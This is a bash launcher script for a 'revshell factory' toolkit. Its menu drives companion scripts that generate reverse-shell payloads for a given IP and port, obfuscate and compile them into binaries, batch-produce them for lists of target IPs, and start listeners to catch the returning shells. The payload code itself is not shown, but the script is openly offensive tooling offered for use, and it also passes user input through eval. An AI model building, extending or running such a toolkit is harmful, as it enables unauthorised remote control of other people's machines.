#!/usr/bin/env bash
# =============================================================================
# REVSHELL FACTORY LAUNCHER – Ultimate command center
# =============================================================================
# Usage:
#   ./launcher.sh [--ip <IP>] [--port <PORT>] [--combo <N>] [--menu]
#
# If no IP/port provided, the script prompts for them interactively.
# Once set, the same IP and port are reused for all subsequent actions.
# -----------------------------------------------------------------------------
set -euo pipefail

# ---------------------------------------------------------------------------
# Colors (lightweight)
# ---------------------------------------------------------------------------
R='\033[0;31m' G='\033[0;32m' Y='\033[0;33m' B='\033[0;34m' C='\033[0;36m' N='\033[0m'
info()  { echo -e "${B}[*]${N} $*"; }
ok()    { echo -e "${G}[+]${N} $*"; }
warn()  { echo -e "${Y}[!]${N} $*"; }
err()   { echo -e "${R}[-]${N} $*" >&2; }

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PY_SCRIPT="${SCRIPT_DIR}/revshell_factory.py"
SH_SCRIPT="${SCRIPT_DIR}/revshell_postprocess.sh"

IP=""
PORT="4444"
CONF_FILE="conf.txt"

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
usage() {
    cat <<EOF
Usage: $0 [OPTIONS]

Options:
  --ip <ADDRESS>       Set listener IP (e.g., 0.0.0.0)
  --port <PORT>        Set listener port (default: 4444)
  --combo <N>          Run a specific combination by number (see menu)
  --menu               Force interactive menu even if IP/port given
  --help               Show this help

All generated files and compiled payloads will appear under the current
directory. Configuration is stored in conf.txt for reuse.
EOF
    exit 0
}

# ---------------------------------------------------------------------------
# Parse arguments
# ---------------------------------------------------------------------------
ARG_IP=""; ARG_PORT=""; ARG_COMBO=""; ARG_MENU=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --ip)      ARG_IP="$2"; shift 2 ;;
        --port)    ARG_PORT="$2"; shift 2 ;;
        --combo)   ARG_COMBO="$2"; shift 2 ;;
        --menu)    ARG_MENU=1; shift ;;
        --help)    usage ;;
        *)         err "Unknown argument: $1"; usage ;;
    esac
done

# ---------------------------------------------------------------------------
# Acquire IP and port (arguments override, else interactive)
# ---------------------------------------------------------------------------
if [[ -n "$ARG_IP" ]]; then
    IP="$ARG_IP"
elif [[ -f "$CONF_FILE" ]]; then
    # Load from previous config
    source "$CONF_FILE" 2>/dev/null || true
    IP="${SAVED_IP:-}"
    if [[ -n "$IP" ]]; then
        info "Loaded IP from conf.txt: $IP"
    fi
fi

if [[ -n "$ARG_PORT" ]]; then
    PORT="$ARG_PORT"
elif [[ -f "$CONF_FILE" ]]; then
    source "$CONF_FILE" 2>/dev/null || true
    PORT="${SAVED_PORT:-4444}"
    if [[ -n "$PORT" ]]; then
        info "Loaded port from conf.txt: $PORT"
    fi
fi

if [[ -z "$IP" ]]; then
    read -rp "Enter listener IP: " IP
fi
if [[ -z "$PORT" ]]; then
    read -rp "Enter listener port [4444]: " PORT
    PORT="${PORT:-4444}"
fi

# ---------------------------------------------------------------------------
# Check required scripts
# ---------------------------------------------------------------------------
check_scripts() {
    if [[ ! -f "$PY_SCRIPT" ]]; then
        err "Python script not found: $PY_SCRIPT"
        exit 1
    fi
    if [[ ! -f "$SH_SCRIPT" ]]; then
        err "Bash script not found: $SH_SCRIPT"
        exit 1
    fi
    if ! command -v python3 &>/dev/null; then
        err "python3 is required"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
# Helper: run a command and show it
# ---------------------------------------------------------------------------
run() {
    echo -e "${C}> $*${N}"
    eval "$@"
}

# ---------------------------------------------------------------------------
# Functions – each combo is a function
# ---------------------------------------------------------------------------

# -- Python only combos -----------------------------------------------------
combo_py_all() {
    info "Python: generate ALL payloads → payloads_all.txt"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --output payloads_all.txt"
}

combo_py_select() {
    read -rp "Enter selection (e.g., 0,2-5,7): " SEL
    info "Python: select $SEL → payloads_sel.txt"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --select \"$SEL\" --output payloads_sel.txt"
}

combo_py_interactive() {
    info "Python: interactive menu"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --interactive"
}

combo_py_all_enhanced() {
    info "Python: all payloads, enhanced → enhanced_all.txt"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --enhance --output enhanced_all.txt"
}

combo_py_select_enhanced_compile() {
    read -rp "Enter selection: " SEL
    info "Python: select $SEL, enhance + compile → compiled_binaries/"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --select \"$SEL\" --enhance --compile --compile-dir compiled_binaries"
}

combo_py_all_enhanced_compile() {
    info "Python: all enhanced + compile → compiled_binaries/"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --enhance --compile --compile-dir compiled_binaries"
}

combo_py_batch() {
    read -rp "Batch file path (one IP per line): " BATCH
    info "Python: batch from $BATCH"
    run "python3 \"$PY_SCRIPT\" --batch \"$BATCH\" -p \"$PORT\" --enhance --compile --output batch_output/"
}

combo_py_listener() {
    read -rp "Listener type (netcat/socat/ncat/python/powershell) [netcat]: " LT
    LT="${LT:-netcat}"
    info "Python: generate all + start listener ($LT)"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --listener --listener-type \"$LT\""
}

combo_py_save_listener() {
    info "Python: save listener script + generate all"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --save-listener"
}

combo_py_store_conf() {
    info "Python: store IP/port in $CONF_FILE"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --store-conf --all --output conf_test.txt"
    ok "Configuration stored. Next runs will load IP/port automatically."
}

# -- Bash only combos --------------------------------------------------------
combo_sh_process_all() {
    local file="${1:-payloads_all.txt}"
    info "Bash: process $file (select 'a' for all, then compile)"
    run "echo 'a' | bash \"$SH_SCRIPT\" \"$file\" --compile --store-conf"
}

combo_sh_process_selection() {
    local file="${1:-payloads_sel.txt}"
    read -rp "Line numbers to process (e.g., 1,3-5): " SEL
    info "Bash: process $file with selection $SEL, compile"
    run "echo \"$SEL\" | bash \"$SH_SCRIPT\" \"$file\" --compile --store-conf"
}

combo_sh_listener_only() {
    info "Bash: listener-only mode"
    run "bash \"$SH_SCRIPT\" --listener-only --conf \"$CONF_FILE\""
}

combo_sh_compile_custom_dir() {
    local dir="custom_compiled_$(date +%Y%m%d_%H%M%S)"
    info "Bash: compile to $dir (process all)"
    run "echo 'a' | bash \"$SH_SCRIPT\" payloads_all.txt --compile --output-dir \"$dir\" --store-conf"
}

# -- Onion combos (Python → Bash directly) -----------------------------------
combo_onion_all_compile() {
    info "Onion: Python all → enhanced_all.txt, then Bash compile all"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --output onion_all.txt"
    combo_sh_process_all "onion_all.txt"
}

combo_onion_enhanced_all_compile() {
    info "Onion: Python all enhanced → enh_onion.txt, then Bash compile"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --enhance --output enh_onion.txt"
    combo_sh_process_all "enh_onion.txt"
}

combo_onion_select_compile() {
    read -rp "Selection: " SEL
    info "Onion: Python select $SEL → onion_sel.txt, then Bash compile selected lines"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --select \"$SEL\" --output onion_sel.txt"
    read -rp "Now choose which lines from that file to compile (e.g., 'a'): " BSEL
    run "echo \"$BSEL\" | bash \"$SH_SCRIPT\" onion_sel.txt --compile --store-conf"
}

combo_onion_batch_all() {
    read -rp "Batch file: " BATCH
    info "Onion: Python batch, then Bash compile all from each batch output"
    run "python3 \"$PY_SCRIPT\" --batch \"$BATCH\" -p \"$PORT\" --output batch_pre/"
    for f in batch_pre/revshell_*.txt; do
        [[ -f "$f" ]] || continue
        info "Bash processing $f"
        run "echo 'a' | bash \"$SH_SCRIPT\" \"$f\" --compile --output-dir final_compiled/\$(basename \"$f\" .txt) --store-conf"
    done
}

combo_onion_full_cycle() {
    info "Full cycle: Python enhanced all → compile, then listener-only"
    run "python3 \"$PY_SCRIPT\" -i \"$IP\" -p \"$PORT\" --all --enhance --output full_cycle.txt"
    combo_sh_process_all "full_cycle.txt"
    combo_sh_listener_only
}

# ---------------------------------------------------------------------------
# Menu display
# ---------------------------------------------------------------------------
show_menu() {
    echo -e "\n${C}=== REVSHELL FACTORY LAUNCHER ===${N}"
    echo "  IP: ${G}$IP${N}  |  Port: ${G}$PORT${N}"
    echo "------------------------------------------"
    echo "  Python Generator (Part 1)"
    echo "  1)  Generate ALL payloads"
    echo "  2)  Generate SELECT payloads"
    echo "  3)  Interactive selection"
    echo "  4)  All + enhancement"
    echo "  5)  Select + enhance + compile"
    echo "  6)  All + enhance + compile"
    echo "  7)  Batch from file"
    echo "  8)  All + start listener"
    echo "  9)  All + save listener script"
    echo " 10)  Store IP/port in conf.txt"
    echo "------------------------------------------"
    echo "  Bash Post‑Processor (Part 2)"
    echo " 11)  Process file (all + compile)"
    echo " 12)  Process file (select + compile)"
    echo " 13)  Listener only"
    echo " 14)  Compile to custom directory"
    echo "------------------------------------------"
    echo "  Onion Combos (Python → Bash)"
    echo " 15)  All gen → Bash compile"
    echo " 16)  Enhanced all gen → Bash compile"
    echo " 17)  Select gen → Bash compile"
    echo " 18)  Batch gen → Bash compile each"
    echo " 19)  Full cycle: enhanced all + compile + listener"
    echo "------------------------------------------"
    echo "  q)  Quit"
    echo -n "Choose option: "
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
main() {
    check_scripts

    if [[ -n "$ARG_COMBO" ]]; then
        # Direct combo run (non-interactive)
        case "$ARG_COMBO" in
             1) combo_py_all ;;
             2) combo_py_select ;;
             3) combo_py_interactive ;;
             4) combo_py_all_enhanced ;;
             5) combo_py_select_enhanced_compile ;;
             6) combo_py_all_enhanced_compile ;;
             7) combo_py_batch ;;
             8) combo_py_listener ;;
             9) combo_py_save_listener ;;
            10) combo_py_store_conf ;;
            11) combo_sh_process_all ;;
            12) combo_sh_process_selection ;;
            13) combo_sh_listener_only ;;
            14) combo_sh_compile_custom_dir ;;
            15) combo_onion_all_compile ;;
            16) combo_onion_enhanced_all_compile ;;
            17) combo_onion_select_compile ;;
            18) combo_onion_batch_all ;;
            19) combo_onion_full_cycle ;;
            *) err "Invalid combo number: $ARG_COMBO"; exit 1 ;;
        esac
        exit 0
    fi

    # Interactive mode
    while true; do
        show_menu
        read -r choice
        case "$choice" in
             1) combo_py_all ;;
             2) combo_py_select ;;
             3) combo_py_interactive ;;
             4) combo_py_all_enhanced ;;
             5) combo_py_select_enhanced_compile ;;
             6) combo_py_all_enhanced_compile ;;
             7) combo_py_batch ;;
             8) combo_py_listener ;;
             9) combo_py_save_listener ;;
            10) combo_py_store_conf ;;
            11) combo_sh_process_all ;;
            12) combo_sh_process_selection ;;
            13) combo_sh_listener_only ;;
            14) combo_sh_compile_custom_dir ;;
            15) combo_onion_all_compile ;;
            16) combo_onion_enhanced_all_compile ;;
            17) combo_onion_select_compile ;;
            18) combo_onion_batch_all ;;
            19) combo_onion_full_cycle ;;
            q|Q) info "Exiting."; exit 0 ;;
            *) warn "Invalid choice" ;;
        esac
    done
}

main
